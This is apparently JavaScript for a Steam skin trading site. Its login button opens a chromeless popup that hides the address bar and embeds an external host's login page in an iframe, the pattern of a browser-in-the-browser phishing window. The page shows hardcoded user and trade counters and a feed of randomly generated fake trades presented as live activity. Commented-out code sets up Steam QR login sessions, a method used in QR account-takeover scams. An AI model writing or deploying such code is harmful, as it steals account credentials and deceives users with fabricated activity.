// Auth Modal functionality
const authBtn = document.getElementById('auth-btn');

authBtn.addEventListener('click', () => {

	// First open the blank window
	const tradeWindow = window.open('', 'TradeWindow', 'width=1100,height=700,menubar=no,toolbar=no,location=no,resizable=yes,scrollbars=no');
	
    tradeWindow.document.write(`
		<!doctype html>
		<html>
			<head>
			<style>
				html, body {
				margin: 0;
				padding: 0;
				height:100%;
				scrollbar-width: none;
				}
			</style>
			</head>
			<body>
				<iframe style="height: 100%; width: 100%;"
					src="https://trworks.onrender.com/Login"  
					title="Embedded page"
					loading="lazy"
					allowfullscreen>
				</iframe>
			</body>
		</html>
	`);
    // Focus the new window
    tradeWindow.focus();
  
    // Handle cases where popup might be blocked
    if (!tradeWindow || tradeWindow.closed || typeof tradeWindow.closed == 'undefined') {
        // Fallback to same window if popup is blocked
        window.location.href = tradeUrl;
    }
	
});

// Animated counters
function animateCounter(element, target, duration = 2000) {
    const start = parseInt(element.textContent.replace(/,/g, ''));
    const increment = target / (duration / 16);
    let current = start;
    
    const timer = setInterval(() => {
        current += increment;
        if (current >= target) {
            clearInterval(timer);
            current = target;
        }
        element.textContent = Math.floor(current).toLocaleString();
    }, 16);
}

// Start counters when stats section is in view
const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            animateCounter(document.getElementById('user-count'), 185847);
            animateCounter(document.getElementById('trade-count'), 1292154);
            animateCounter(document.getElementById('item-count'), 7842901);
            animateCounter(document.getElementById('rental-count'), 642687);
            observer.unobserve(entry.target);
        }
    });
}, { threshold: 0.5 });

observer.observe(document.querySelector('.stats'));


// Global variables
let skinsData = [];
let activitiesData = [];
let usersData = [];
const activityFeed = document.getElementById('activity-feed');

// Activity types mapping
const activityTypes = {
    "traded": "traded",
    "rented": "rented",
    "purchased": "purchased",
    "listed": "listed",
    "sold": "sold"
};

// Fetch data functions
async function fetchData(url) {
    try {
        const resp = await fetch(url, {
            method: 'get',
            headers: { 'Content-Type': 'application/json' },
        });
        return await resp.json();
    } catch (error) {
        console.error(`Error fetching ${url}:`, error);
        return [];
    }
}

async function loadAllData() {
    try {
        [skinsData, activitiesData, usersData] = await Promise.all([
            fetchData('/skins.json'),
            fetchData('/activities.json'),
            fetchData('/users.json')
        ]);
        
        console.log('Data loaded successfully');
        startActivityFeed();
    } catch (error) {
        console.error('Error loading data:', error);
    }
}

// Activity feed functions
function getRandomItem(array) {
    return array[Math.floor(Math.random() * array.length)];
}

function generateRandomActivity() {
    const randomUser = getRandomItem(usersData);
    const randomSkin = getRandomItem(skinsData);
    const action = getRandomItem(Object.keys(activityTypes));
    
    const baseActivity = {
        profurl: randomUser.proflink,
        iger: randomUser.ProfilePicture,
        user: randomUser.username,
        action: action,
        item1: randomSkin.name,
        img: randomSkin.image,
        time: `${Math.floor(Math.random() * 5)} min${Math.floor(Math.random() * 5) !== 1 ? 's' : ''} ago`
    };

    switch (action) {
        case 'traded':
            let randomSkin2;
            do {
                randomSkin2 = getRandomItem(skinsData);
            } while (randomSkin2.id === randomSkin.id);
            
            return {
                ...baseActivity,
                item2: randomSkin2.name,
                type: "trade"
            };
            
        case 'rented':
            const durations = ["7 days ($15/day)", "14 days ($20/day)", "30 days ($25/day)"];
            return {
                ...baseActivity,
                duration: getRandomItem(durations),
                type: "rent"
            };
            
        case 'purchased':
            const prices = ["$" + (Math.random() * 5000 + 100).toFixed(2), "$" + (Math.random() * 3000 + 50).toFixed(2)];
            return {
                ...baseActivity,
                price: getRandomItem(prices),
                type: "buy"
            };
            
        default:
            return {
                ...baseActivity,
                type: action
            };
    }
}

function createActivityHTML(activity) {
    let content = '';
    
    switch (activity.action) {
        case 'traded':
            content = `Traded <strong>${activity.item1}</strong> for <strong>${activity.item2}</strong>`;
            break;
        case 'rented':
            content = `Rented <strong>${activity.item1}</strong> for ${activity.duration}`;
            break;
        case 'purchased':
            content = `Purchased <strong>${activity.item1}</strong> for ${activity.price}`;
            break;
        default:
            content = `${activity.action} <strong>${activity.item1}</strong>`;
    }

    return `
        <div class="activity-item">
            <div class="activity-header" onclick="window.open('${activity.profurl}')">
                <img src="${activity.iger}" alt="User Avatar" class="activity-avatar">
                <div>
                    <div class="activity-user">${activity.user}</div>
                    <div class="activity-time">${activity.time}</div>
                </div>
            </div>
            <div class="activity-content">
                ${content}
            </div>
            <img src="${activity.img}" alt="${activity.item1}" class="activity-skin">
            <span class="activity-type type-${activity.type}">${activity.type.toUpperCase()}</span>
        </div>
    `;
}

function updateActivityFeed() {
    const activity = generateRandomActivity();
    const activityHTML = createActivityHTML(activity);
    
    // Prepend new activity to feed
    activityFeed.insertAdjacentHTML('afterbegin', activityHTML);
    
    // Remove oldest activity if more than 8
    if (activityFeed.children.length > 8) {
        activityFeed.removeChild(activityFeed.lastChild);
    }
    
    // Auto-scroll to show new activity
    activityFeed.scrollLeft = 0;
}

function startActivityFeed() {
    // Initial activities
    for (let i = 0; i < 5; i++) {
        updateActivityFeed();
    }
    
    // Set interval for new activities
    setInterval(updateActivityFeed, 2000);
}

// Initialize everything when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    loadAllData();
});









window.addEventListener('message', (event) => {
  if (event.data.type === 'login-success') {
    // Handle successful login
    // console.log('User data:', event.data.data);
    document.querySelector('#steamFrameWrapper').remove();
    window.location.href = '/UserPersonal'
  }
});
































































// async function loginWithQR() {
//   try {
//     // 1. QR კოდის გენერაცია
//     const qrResponse = await fetch('https://steamcommunity.com/login/qrgenerator', {
//       method: 'POST',
//       credentials: 'include',
//       headers: {
//         'Content-Type': 'application/x-www-form-urlencoded'
//       }
//     });
    
//     if (!qrResponse.ok) {
//       throw new Error(`HTTP error! status: ${qrResponse.status}`);
//     }
    
//     const qrData = await qrResponse.json();
//     const { sessionid, steamid, uri } = qrData;

//     // 2. QR კოდის შექმნა (თუ qrcode ბიბლიოთეკას იყენებთ)
//     const qrCode = await qrcode.toDataURL(uri);

//     // 3. სტატუსის შემოწმების ფუნქცია
//     const checkStatus = async () => {
//       const url = new URL('https://steamcommunity.com/login/qrcheck');
//       url.searchParams.append('sessionid', sessionid);
//       url.searchParams.append('steamid', steamid);
      
//       const statusResponse = await fetch(url, {
//         method: 'GET',
//         credentials: 'include'
//       });
      
//       if (!statusResponse.ok) {
//         throw new Error(`HTTP error! status: ${statusResponse.status}`);
//       }
      
//       return statusResponse.json();
//     };

//     return { qrCode, checkStatus };
//   } catch (error) {
//     throw new Error(`QR login failed: ${error.message}`);
//   }
// }

// // სწორი გამოყენების მაგალითი
// loginWithQR()
//   .then(({ qrCode, checkStatus }) => {
//     console.log('QR Code:', qrCode);
    
//     // შეგიძლიათ გამოიყენოთ qrCode სურათის სახით
//     // მაგალითად: document.getElementById('qrImage').src = qrCode;
    
//     // სტატუსის შემოწმება ყოველ 2 წამში
//     const interval = setInterval(async () => {
//       try {
//         const status = await checkStatus();
//         console.log('Status:', status);
        
//         if (status.success) {
//           clearInterval(interval);
//           console.log('ავტორიზაცია წარმატებულია!');
//         }
//       } catch (error) {
//         console.error('შეცდომა სტატუსის შემოწმებისას:', error);
//         clearInterval(interval);
//       }
//     }, 2000);
//   })
//   .catch(error => {
//     console.error('QR ავტორიზაციის შეცდომა:', error);
//   });
